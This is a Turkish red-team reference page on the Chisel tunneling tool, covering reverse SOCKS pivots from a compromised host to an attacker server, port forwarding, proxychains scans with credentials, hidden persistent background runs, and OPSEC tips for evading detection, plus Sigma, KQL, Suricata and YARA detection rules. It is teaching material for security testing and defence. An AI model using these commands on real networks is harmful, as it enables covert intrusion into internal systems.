# Chisel

> **Kategori:** [16. TÜNELLEME, PİVOT VE SOCKS PROXY (PIVOTING & TUNNELING)](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** HTTP/WebSocket protokolü üzerinden tünellenmiş ve SSH şifrelemesi ile korunan, kısıtlı kurumsal güvenlik duvarlarını aşarak iç Active Directory ağlarına ters (reverse) veya düz (forward) SOCKS5/TCP erişimi sağlayan yüksek performanslı pivot aracı.

---

## 1. Genel Bakış ve Amaç

Active Directory sızma testlerinde ve kırmızı takım operasyonlarında dış ağa açık bir DMZ sunucusu (web sunucusu, VPN ağ geçidi vb.) ele geçirildiğinde, bu makinenin arkasındaki iç etki alanı ağına (Domain Controllers, dosya sunucuları, veritabanları) doğrudan erişim kurumsal güvenlik duvarları (Firewall/NGFW) ve Ağ Adresi Çeviricileri (NAT) tarafından engellenir. Geleneksel SSH tünelleri (Local/Remote Port Forwarding) veya VPN protokolleri, kurumsal sınır ağlarında SSH portunun (22) kapatılmış olması veya Derin Paket İncelemesi (DPI) sistemlerinin SSH trafiğini tespit edip kesmesi sebebiyle sıklıkla başarısız olur.

Jaime Pillora (@jpillora) tarafından Go diliyle geliştirilen **Chisel**, bu ağ kısıtlamalarını aşmak için modern bir tünelleme mimarisi sunar. Chisel, TCP ve UDP veri akışlarını standart HTTP/HTTPS ve WebSocket paketleri içerisine kapsüller (encapsulation). Ağ üzerinde akan trafik, güvenlik duvarları ve proxy denetleyicileri tarafından sıradan bir web (HTTP/HTTPS) oturumu olarak algılanır. Aynı zamanda Chisel, istemci ile sunucu arasındaki tüm iletişimi dahili SSH v2 şifreleme katmanıyla korur; böylece araya giren ağ izleme araçları şifrelenmiş tünelin içeriğini göremez. Tek bir çalıştırılabilir ikili dosya (static binary) hem sunucu (`chisel server`) hem de istemci (`chisel client`) rolünü üstlenebilir. Kırmızı takım operatörleri, kurumsal ağ içindeki ele geçirilen bir makineden kendi saldırgan sunucularına bir ters tünel (`reverse socks`) açarak, dışarıdan kurumsal iç ağın tamamına SOCKS5 ve Proxychains üzerinden doğrudan erişim elde ederler.

```
+---------------------------------------------------------------------------------------------------+
|                                  CHISEL TERS TÜNELLEME VE PİVOT AKIŞI                             |
+---------------------------------------------------------------------------------------------------+

 [ Saldırgan / C2 Sunucusu ] (Public IP: 198.51.100.10)
             │
             ├─► 1. Chisel Sunucusunu Başlatır:
             │      chisel server -p 8080 --reverse --socks5
             │      (Yerel Port 1080'de Dinleyen Dinamik SOCKS5 Proxy Açar)
             │
             ▲
   Kurumsal Güvenlik Duvarı (Firewall / DPI)
   (Giden HTTP/HTTPS Port 8080 İzni - Gelen Bağlantılar Engelli)
             ▲
             │ 2. İstemci Dışarıya Doğru Standart HTTP WebSocket Bağlantısı Açar
             │    Trafik Dahili SSH ile Şifrelenir (DPI Atlama)
             │
 [ Ele Geçirilen DMZ / İç Ağ Sunucusu ] (Pivot Noktası: 10.10.10.5)
             │
             ├─► 3. Chisel İstemcisini Yürütür:
             │      chisel client 198.51.100.10:8080 R:socks
             │
             ▼
 [ Kurumsal İç Active Directory Ağı ]
 (10.10.10.0/24 - DC01, Dosya Paylaşımları, MSSQL)
             │
             ├─► 4. Saldırgan kendi makinesinde proxychains nmap/crackmapexec çalıştırır:
             │      proxychains netexec smb 10.10.10.0/24
             │
             └─► 5. Trafik Saldırgan -> Chisel SOCKS5 (1080) -> DMZ Host -> AD İçi Hedefler
```

### Neden Önemli?

| Özellik | Operasyonel Avantajı |
|:---|:---|
| **HTTP/WebSocket Kapsülleme** | Katı kurumsal vekil sunucuları (Squid, BlueCoat vb.) ve güvenlik duvarlarını standart web trafiği gibi aşar. |
| **Dahili SSH v2 Şifreleme** | Ağ seviyesindeki IDS/IPS sistemlerinin tünel içindeki NTLM, SMB veya Kerberos paketlerini incelemesini engeller. |
| **Ters SOCKS5 (Reverse Proxy)** | İçerideki kurban makineden dışarıya tek bir bağlantı ile saldırgan tarafında dinamik SOCKS5 proxy oluşturur. |
| **Statik ve Çapraz Platform** | Linux, Windows, macOS, ARM ve MIPS mimarilerinde harici bağımlılık olmadan tek ikili dosya olarak çalışır. |
| **Çift Yönlü Port Yönlendirme** | Hem yerel portları hedefe (`L:local:remote`), hem uzak portları saldırgana (`R:remote:local`) yönlendirebilir. |

### Pivot ve Tünelleme Araçlarıyla Karşılaştırma

| Kriter | Chisel | Ligolo-ng | SSH / Plink | Rpivot |
|:---|:---|:---|:---|:---|
| **Aktarım Protokolü** | HTTP / WebSocket | TLS / TCP | SSH | HTTP (Python) |
| **Tünel Tipi** | SOCKS5 & Port Yönlendirme | TUN Arabirimi (L3 VPN) | SOCKS4/5 & Port Yönlendirme | SOCKS4 |
| **Proxychains Bağımlılığı** | ✅ Gerekir (SOCKS5) | ❌ Gerekmez (IP Tabanlı) | ✅ Gerekir (SOCKS) | ✅ Gerekir |
| **Nmap UDP / ICMP Desteği**| ⚠️ Kısıtlı (TCP Ağırlıklı) | ✅ Tam Destek (TUN L3) | ❌ Yalnızca TCP | ❌ Yalnızca TCP |
| **Statik Bağımsız Binary** | ✅ Evet (Go) | ✅ Evet (Go) | ⚠️ SSH İstemcisi Gerekir | ❌ Python Bağımlılığı |
| **Kurumsal Proxy Atlama** | ✅ Mükemmel (`--proxy`) | ⚠️ Orta | ❌ Düşük | ✅ İyi |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

Chisel ikili dosyası `server` ve `client` alt komutları ile çalıştırılır.

```bash
# Sunucu Sözdizimi
chisel server [SEÇENEKLER]

# İstemci Sözdizimi
chisel client [SEÇENEKLER] <SUNUCU_ADRESI> <YONLENDIRME_TANIMI>...
```

### 2.1 Sunucu (Server) Parametreleri

| Parametre | Açıklama | Tür | Örnek Değer |
|:---|:---|:---|:---|
| `-p, --port <port>` | Chisel sunucusunun dinleyeceği TCP bağlantı noktası (Varsayılan: 8080). | Ağ | `-p 443` |
| `--reverse` | İstemcilerin sunucu üzerinde ters yönlendirme (`R:`) açmasına izin verir (Kritik). | Güvenlik | `--reverse` |
| `--socks5` | Sunucu tarafında yerel SOCKS5 proxy desteğini etkinleştirir. | Proxy | `--socks5` |
| `--auth <user:pass>` | İstemcilerin sunucuya bağlanırken kimlik doğrulaması yapmasını zorunlu kılar. | Kimlik Doğrulama | `--auth admin:SecretPass123` |
| `--tls-cert <dosya>` | HTTPS/TLS şifrelemesi için sunucu sertifikası dosya yolu. | Kripto | `--tls-cert cert.pem` |
| `--tls-key <dosya>` | TLS şifrelemesi için sunucu özel anahtar dosya yolu. | Kripto | `--tls-key key.pem` |
| `-v` | Ayrıntılı hata ayıklama (verbose) loglarını ekrana basar. | Loglama | `-v` |

### 2.2 İstemci (Client) Parametreleri

| Parametre | Açıklama | Tür | Örnek Değer |
|:---|:---|:---|:---|
| `<SUNUCU_ADRESI>` | Hedef Chisel sunucusunun IP ve portu. | Bağlantı | `198.51.100.10:443` |
| `R:socks` | Sunucuda rastgele bir portta ters dinamik SOCKS5 proxy açar. | Tünel | `R:socks` |
| `R:<port>:socks` | Sunucuda belirtilen portta ters dinamik SOCKS5 proxy açar. | Tünel | `R:1080:socks` |
| `R:<uzak_p>:<hedef_ip>:<hedef_p>` | İç ağdaki belirli bir IP/portu sunucunun uzak portuna yönlendirir. | Port Yönlendirme | `R:3389:10.10.10.100:3389` |
| `--auth <user:pass>` | Sunucu tarafından talep edilen kimlik doğrulama bilgisi. | Kimlik Doğrulama | `--auth admin:SecretPass123` |
| `--proxy <vekil_adresi>` | Kurumsal HTTP/HTTPS vekil sunucusu üzerinden bağlantı kurar. | Kurumsal Egress | `--proxy http://proxy.corp:8080` |
| `--fingerprint <hash>` | Sunucunun TLS/SSH açık anahtar parmak izini doğrular (MITM Koruması). | Güvenlik | `--fingerprint d8:e4:...` |
| `--keepalive <sure>` | Bağlantının canlı tutulması için gönderilecek sinyal aralığı (Varsayılan: 25s). | Ağ Dayanıklılığı| `--keepalive 10s` |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Ters Dinamik SOCKS5 Proxy Oluşturma (Standart Operasyon)
Kırmızı takım operasyonlarında en sık kullanılan pivot biçimidir. Saldırgan kendi sunucusunda dinleyici açar, ele geçirilen Windows DMZ sunucusundan ters bağlantı tetiklenir.

**Adım 1: Saldırgan Makinesinde Sunucuyu Başlatma**
```bash
chisel server -p 8443 --reverse -v
```

```text
2026/10/14 21:42:01 server: Reverse tunnelling enabled
2026/10/14 21:42:01 server: Fingerprint 8a:12:4f:b3:90:c1:05:4e:32:9d:87:a6:55:21:ee:10
2026/10/14 21:42:01 server: Listening on http://0.0.0.0:8443
```

**Adım 2: Kurban Windows Makinede İstemciyi Tetikleme**
```cmd
chisel.exe client 198.51.100.10:8443 R:1080:socks
```

```text
2026/10/14 21:42:05 client: Connecting to ws://198.51.100.10:8443
2026/10/14 21:42:06 client: Handshaking...
2026/10/14 21:42:06 client: Sending config
2026/10/14 21:42:06 client: Connected (Latency 34.2ms)
```

Saldırgan tarafında beliren onay:
```text
2026/10/14 21:42:06 server: session#1: tun: proxy#R:1080=>socks: Listening
```

Artık saldırgan makinesinde `127.0.0.1:1080` üzerinde tam yetkili bir SOCKS5 proxy oluşmuştur.

### Senaryo 2: Proxychains ile İç Ağdaki Domain Controller'ı Tarama
Açılan SOCKS5 proxy üzerinden iç etki alanı denetleyicisine SMB ve LDAP sorguları yönlendirilir.

`/etc/proxychains4.conf` dosyasının son satırına eklenir:
```text
socks5 127.0.0.1 1080
```

Ardından araçlar çalıştırılır:
```bash
proxychains -q nxc smb 10.10.10.10 -u 'Administrator' -p 'P@ssw0rd123!'
```

```text
SMB         10.10.10.10     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:CORP.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.10     445    DC01             [+] CORP.LOCAL\Administrator:P@ssw0rd123! (Pwn3d!)
```

### Senaryo 3: İç Ağdaki İzole RDP Servisini Saldırgan Portuna Yönlendirme (Port Forward)
İç ağda bulunan ve yalnızca DMZ sunucusunun erişebildiği `10.10.10.50` IP'li bir finans sunucusunun RDP (3389) portu, doğrudan saldırganın `localhost:33890` portuna çekilir.

```cmd
chisel.exe client 198.51.100.10:8443 R:33890:10.10.10.50:3389
```

Saldırgan kendi makinesinde RDP istemcisini açar:
```bash
xfreerdp /v:127.0.0.1:33890 /u:DomainAdmin /p:Pass123 /cert-ignore
```

### Senaryo 4: Kurumsal HTTP Proxy Arkasından Tünel Açma
Kurban makinenin doğrudan internete çıkışı engelliyse ve yalnızca kurumsal vekil sunucu (örneğin `proxy.corp.local:8080`) üzerinden web'e gidebiliyorsa:

```cmd
chisel.exe client --proxy http://proxy.corp.local:8080 198.51.100.10:443 R:1080:socks
```

```text
2026/10/14 21:42:15 client: Using proxy http://proxy.corp.local:8080
2026/10/14 21:42:16 client: Connecting to ws://198.51.100.10:443
2026/10/14 21:42:17 client: Connected (Latency 58.1ms)
```

### Senaryo 5: TLS Şifreli ve Kimlik Doğrulamalı Güvenli Tünel
Ağ izleme sistemlerini tamamen yanıltmak için Let's Encrypt veya self-signed SSL sertifikası ile HTTPS üzerinden kimlik doğrulamalı tünel kurulur.

**Saldırgan Sunucusu:**
```bash
chisel server -p 443 --reverse --tls-cert fullchain.pem --tls-key privkey.pem --auth redteam:K1rm1z1T@k1m2026!
```

**Kurban İstemci:**
```cmd
chisel.exe client --auth redteam:K1rm1z1T@k1m2026! https://198.51.100.10:443 R:1080:socks
```

### Senaryo 6: Linux Kurban Üzerinde Arka Planda Kalıcı Daemon Olarak Çalıştırma
Linux tabanlı bir web sunucusunda nohup ile arka planda bağlantının sürekliliği sağlanır.

```bash
nohup /tmp/.chisel client --keepalive 15s 198.51.100.10:8443 R:1080:socks >/dev/null 2>&1 &
```

Doğrulama:
```bash
ps aux | grep chisel
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı / Belirti | Olası Neden | Kesin Çözüm Adımı |
|:---|:---|:---|
| `client: Handshaking failed: websocket: bad handshake (Status 400 or 403)` | İstemci ve sunucu arasındaki kimlik doğrulama (`--auth`) uyuşmuyor veya sunucu tarafında `--reverse` bayrağı unutulmuştur. | Sunucunun `--reverse` bayrağıyla başlatıldığından emin olun. İstemcideki `--auth` kullanıcı adı ve parolasını kontrol edin. |
| `server: Reverse port forwarding not allowed` | Sunucu komut satırında `--reverse` parametresi tanımlanmamıştır. | Sunucu sürecini durdurun ve `chisel server --reverse ...` şeklinde yeniden başlatın. |
| `client: Failed to connect to server: dial tcp: i/o timeout` | Kurban makinenin giden güvenlik duvarı (egress firewall) hedef porta izin vermemektedir. | Chisel sunucusunu standart çıkış izinlerine sahip 80, 443 veya 53 gibi portlarda dinletin. |
| `server: Requesting socks proxy: listen tcp 127.0.0.1:1080: bind: address already in use` | Saldırgan makinesinde 1080 portu başka bir süreç (Tor, eski Chisel, SSH) tarafından kullanılmaktadır. | `lsof -i :1080` veya `netstat -tlpn` ile portu kullanan süreci sonlandırın ya da `R:1081:socks` gibi farklı bir port seçin. |
| `proxychains: Connection refused (127.0.0.1:1080)` | Chisel istemcisi düşmüş, tünel kopmuş veya proxychains yapılandırmasında port yanlış yazılmıştır. | Kurban taraftaki Chisel istemcisini `--keepalive 10s` ile yeniden başlatın; `/etc/proxychains4.conf` satırını teyit edin. |
| `TLS: certificate signed by unknown authority` | Sunucuda kendinden imzalı (self-signed) sertifika kullanılmıştır ve istemci kök sertifikayı tanımamaktadır. | İstemci komutunda `--fingerprint <hash>` parametresini belirterek sunucu parmak izini açıkça onaylayın. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

```
+---------------------------------------------------------------------------------------------------+
|                                 CHISEL TESPİT VE GÖZLEMLENEBİLİRLİK                               |
+---------------------------------------------------------------------------------------------------+

 [ Ağ İletişimi (Ağ Kartı Seviyesi) ]
  - Dış IP'ye Sürekli TCP/WebSocket Bağlantısı ====> Sysmon Event ID 3 (Network Connection)
  - HTTP Header: "Upgrade: websocket"          ====> Zeek / Suricata WebSocket Tespiti
  - Uzun Süreli Açık Kalan Oturum (Long-Lived)

 [ Süreç ve Bellek İzleri ]
  - Go Derlemesi (Go Build ID, runtime paketleri) => EDR / Antivirus Statik İmza Analizi
  - Komut Satırı Argümanları: "R:socks", "client" => Sysmon Event ID 1 (Process Create)

 [ İç Ağ Trafik Anomalisi ]
  - DMZ Sunucusundan DC'ye Anormal SMB/LDAP   ====> SIEM / NDR Davranışsal Analizi
  - Port 445/389/88/135 Yoğunlaşması
```

### 5.1 Bırakılan İzler ve Windows Olay Günlükleri
* **Sysmon Event ID 3 (Network Connection):** Chisel istemcisinin çalıştırıldığı kurban makineden dış bir IP adresine (örneğin port 443 veya 8443) doğru kurulan ve saatlerce açık kalan sürekli TCP bağlantısı.
* **Sysmon Event ID 1 (Process Creation):** Komut satırında `R:socks`, `R:1080:socks` gibi açıkça tünelleme sözdizimini içeren argümanların loglanması.
* **Windows Security Event ID 4624 (Logon Type 3):** İç ağdaki hedef sunucularda (DC, üye sunucular), DMZ makinesinin IP adresinden gelen ve normalde beklenmeyen ağ oturum açma olayları.

### 5.2 Ağ ve EDR İmzaları
* **WebSocket Başlık İmzası:** Chisel'ın HTTP el sıkışması sırasında gönderdiği standart HTTP başlıkları (örneğin varsayılan User-Agent veya eksik standart tarayıcı başlıkları) Network Traffic Analysis (NTA/NDR) sistemleri tarafından yakalanabilir.
* **Go Runtime Bellek Analizi:** Bellek dökümünde Go dili çalışma zamanına ait stringler (`chisel/share/...`, `github.com/jpillora/chisel`) tespit edilir.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Taktik | Teknik ID | Teknik Adı | Kullanım Amacı |
|:---|:---|:---|:---|
| **Command and Control** | `T1090.002` | Proxy: External Proxy | Dış sunucudaki Chisel dinleyicisi üzerinden ağ trafiğini vekil etme. |
| **Command and Control** | `T1572` | Protocol Tunneling | SSH trafiğini HTTP/WebSocket oturumları içerisine kapsülleyerek tünelleme. |
| **Command and Control** | `T1573.002` | Encrypted Channel: Asymmetric Cryptography | Tünel verilerini SSH açık/özel anahtarlarıyla şifreleme. |
| **Defense Evasion** | `T1001.003` | Data Obfuscation: Protocol Impersonation | Kurumsal güvenlik duvarlarını atlatmak için HTTP/HTTPS web trafiğini taklit etme. |

### 5.4 OPSEC Risk ve Önlem Tablosu

| Tespit Riski | Risk Seviyesi | Operasyonel Önlem / Kaçınma Yöntemi |
|:---|:---|:---|
| Açık Komut Satırı Argümanları | **YÜKSEK** | `R:socks` argümanını komut satırından geçirmek yerine yapılandırma dosyasından okutun veya parametreleri gizleyen wrapper'lar kullanın. |
| Standart Port Kullanımı | **ORTA** | 8080 veya 8443 yerine standart giden web portlarını (443) tercih edin. |
| Düz Metin HTTP (DPI Riski) | **YÜKSEK** | Mutlaka geçerli bir SSL/TLS sertifikası (`--tls-cert`) kullanın ve trafiği gerçek HTTPS olarak maskeleyin. |
| Varsayılan Binary Hash'i | **KRİTİK** | GitHub release derlemesini kullanmayın; Go kaynak kodunu `garble` ile derleyerek tüm sembol ve metinleri karıştırın (obfuscation). |

### 5.5 Tespit Kuralı Örnekleri (Sigma & KQL)

#### Sigma Kuralı (Komut Satırında Chisel Parametre Tespiti):
```yaml
title: Chisel Tunneling Client Execution
id: c79024f9-2b0e-436e-b1cf-71d34c1b52a1
status: production
description: Detects the execution of Chisel client with tunneling arguments.
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    CommandLine|contains:
      - 'client '
      - 'R:socks'
      - 'R:1080'
      - 'server --reverse'
  condition: selection
falsepositives:
  - Legitimate administrative port forwarding (rare)
level: high
```

#### Microsoft Sentinel KQL Sorgusu:
```kusto
DeviceProcessEvents
| where ProcessCommandLine has_any ("chisel", "chisel.exe") and ProcessCommandLine has_any ("R:socks", "R:1080", "client")
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName
```

#### Suricata / Snort Ağ Tespit Kuralı:
```text
alert tcp any any -> any any (msg:"INDICATOR-COMPROMISE Chisel Reverse SOCKS Tunnel Handshake"; flow:established,to_server; content:"GET "; http_method; content:"Upgrade: websocket"; http_header; content:"Sec-WebSocket-Key"; http_header; content:"/chisel"; nocase; sid:10008432; rev:1;)
```

#### Incident Response (IR) PowerShell Ağ Bağlantısı İnceleme:
```powershell
# Dış IP'lere sürekli açık kalan şüpheli TCP bağlantılarını ve ilgili süreçleri listeleme
Get-NetTCPConnection -State Established | Where-Object {
    $_.RemoteAddress -notmatch "10\..*|192\.168\..*|172\.(1[6-9]|2[0-9]|3[0-1])\..*"
} | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, OwningProcess, @{N='Process';E={(Get-Process -Id $_.OwningProcess).ProcessName}}
```

#### YARA Kuralı (Statik Chisel İkili Tespiti):
```yara
rule HackTool_Go_Chisel_Artifacts {
    meta:
        description = "Detects Chisel TCP/UDP tunnel binary compiled with Go"
        author = "RedTeam SecOps"
        date = "2026-10-14"
        reference = "https://github.com/jpillora/chisel"
    strings:
        $s1 = "github.com/jpillora/chisel/share" ascii
        $s2 = "chisel/client" ascii
        $s3 = "chisel/server" ascii
        $s4 = "R:socks" ascii wide
        $s5 = "Fingerprint" ascii wide
    condition:
        uint16(0) == 0x5A4D or uint32(0) == 0x464C457F and 3 of ($s*)
}
```

### 5.6 Savunma Karşılığı ve Sertleştirme
* **Giden Trafik Kısıtlaması (Strict Egress Filtering):** DMZ ve sunucu segmentlerinden internete doğru keyfi portlara giden bağlantılar engellenmeli; yalnızca onaylı kurumsal proxy IP'lerine izin verilmelidir.
* **TLS İncelemesi ve SSL Decryption (Next-Gen Firewall):** Giden HTTPS trafiği derinlemesine çözülmeli (SSL Inspection), WebSocket protokolü üzerinden akan yetkisiz SSH tünelleri uygulama denetimi (App-ID) ile düşürülmelidir.

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Cheat Sheet)

#### 1. Saldırgan Tarafında Standart Ters Tünel Sunucusu Başlatma
```bash
chisel server -p 8080 --reverse
```
* **Ne Yapar?:** Port 8080 üzerinde istemcilerin ters bağlantı (`R:`) kurabileceği Chisel sunucusunu dinlemeye alır.
* **Ne Zaman Kullanılır?:** Pivot operasyonunun en başında saldırgan sisteminde çalıştırılır.
* **Parametreler:** `-p 8080` (dinleme portu), `--reverse` (ters bağlantıya izin ver).

#### 2. Kurban Makinede Ters Dinamik SOCKS5 Proxy Başlatma
```cmd
chisel.exe client 198.51.100.10:8080 R:1080:socks
```
* **Ne Yapar?:** Saldırganın makinesinde `127.0.0.1:1080` portunda iç ağa açılan dinamik SOCKS5 proxy oluşturur.
* **Ne Zaman Kullanılır?:** DMZ'deki makineden iç ağın tamamını taramak ve sızmak için.
* **Parametreler:** `R:1080:socks` (uzak port 1080'de SOCKS aç).

#### 3. Tekil Bir İç Ağ Portunu Saldırgana Yönlendirme (Port Forwarding)
```cmd
chisel.exe client 198.51.100.10:8080 R:8443:10.10.10.20:443
```
* **Ne Yapar?:** İç ağdaki `10.10.10.20` sunucusunun 443 web portunu saldırganın yerel `8443` portuna bağlar.
* **Ne Zaman Kullanılır?:** İç web uygulamalarına (vCenter, Exchange ECP) doğrudan tarayıcı ile erişmek için.
* **Parametreler:** `R:<saldırgan_port>:<hedef_ip>:<hedef_port>`.

#### 4. Kurumsal Web Proxy Üzerinden Tünel Kurma
```cmd
chisel.exe client --proxy http://10.10.1.254:8080 198.51.100.10:443 R:1080:socks
```
* **Ne Yapar?:** İç ağdaki kurumsal HTTP vekil sunucusu üzerinden dışarıdaki Chisel sunucusuna bağlanır.
* **Ne Zaman Kullanılır?:** Doğrudan internet erişimi olmayan izole kurumsal ortamlarda.
* **Parametreler:** `--proxy <proxy_url>`.

#### 5. Kimlik Doğrulamalı Güvenli Sunucu Açma
```bash
chisel server -p 443 --reverse --auth ops_user:S3cur3Tunn3l!
```
* **Ne Yapar?:** Tünel sunucusunu kullanıcı adı ve parola kontrolü ile yetkisiz erişimlere kapatır.
* **Ne Zaman Kullanılır?:** İnternete açık C2 sunucusuna yabancı taramaların bağlanmasını önlemek için.
* **Parametreler:** `--auth <user:pass>`.

#### 6. Kimlik Doğrulama Bilgisi ile Bağlantı Kurma
```cmd
chisel.exe client --auth ops_user:S3cur3Tunn3l! 198.51.100.10:443 R:1080:socks
```
* **Ne Yapar?:** Kimlik doğrulamalı Chisel sunucusuna oturum açarak tüneli başlatır.
* **Ne Zaman Kullanılır?:** Parola korumalı Chisel sunucularına bağlanırken.
* **Parametreler:** `--auth <user:pass>`.

#### 7. Bağlantı Canlılığını Korumak İçin Keepalive Süresini Ayarlama
```cmd
chisel.exe client --keepalive 10s 198.51.100.10:8080 R:1080:socks
```
* **Ne Yapar?:** Her 10 saniyede bir ping göndererek güvenlik duvarlarının boşta kalan (idle) oturumu kesmesini engeller.
* **Ne Zaman Kullanılır?:** Agresif zaman aşımı (timeout) kuralları olan ağlarda bağlantının kopmasını önlemek için.
* **Parametreler:** `--keepalive 10s`.

#### 8. TLS Parmak İzi Doğrulaması ile MITM Engelleme
```cmd
chisel.exe client --fingerprint a1:b2:c3:d4:... 198.51.100.10:443 R:1080:socks
```
* **Ne Yapar?:** Sunucunun SSH/TLS anahtar parmak izini kontrol ederek aradaki SSL çözücüleri atlatır veya teyit eder.
* **Ne Zaman Kullanılır?:** Kurban ağda SSL denetimi (inspection) yapan cihazların tüneli bozmasını engellemek için.
* **Parametreler:** `--fingerprint <hash>`.

#### 9. Saldırgan Tarafından İç Ağa Doğru Düz Tünel Açma (Forward Port)
```bash
chisel client 10.10.10.5:8080 3389:10.10.10.100:3389
```
* **Ne Yapar?:** Saldırgan makinesinden kurban üzerindeki Chisel sunucusuna düz tünelleme yapar.
* **Ne Zaman Kullanılır?:** Kurban makineye doğrudan gelen bağlantı izin veriliyorsa.
* **Parametreler:** `<yerel_port>:<hedef_ip>:<hedef_port>`.

#### 10. Linux Sistemde Arka Planda Sessiz Çalıştırma
```bash
nohup ./chisel client 198.51.100.10:8080 R:1080:socks >/dev/null 2>&1 &
```
* **Ne Yapar?:** Terminal kapansa dahi tünelin arka planda sürekli çalışmasını sağlar.
* **Ne Zaman Kullanılır?:** SSH oturumu sonlandırıldığında pivotun düşmemesi için.
* **Parametreler:** `nohup ... &`.

---

## Kaynaklar

* [Jaime Pillora (jpillora) Resmi GitHub Deposu: Chisel](https://github.com/jpillora/chisel)
* [The Hacker Recipes: Pivoting with Chisel](https://www.thehacker.recipes/a-d/movement/pivoting/chisel)
* [HackTricks: Pivoting and Tunneling (Chisel Guide)](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/tunneling-and-port-forwarding.html#chisel)
* [MITRE ATT&CK: Protocol Tunneling (T1572)](https://attack.mitre.org/techniques/T1572/)
* [MITRE ATT&CK: External Proxy (T1090.002)](https://attack.mitre.org/techniques/T1090/002/)

---

> **Önceki:** [← GodPotato (Kategori 15)](../Kategori_15_Yerel_Yetki_Yukseltme_ve_Potato_Ailesi/GodPotato.md) · **Sonraki:** [Ligolo-ng →](./Ligolo-ng.md)
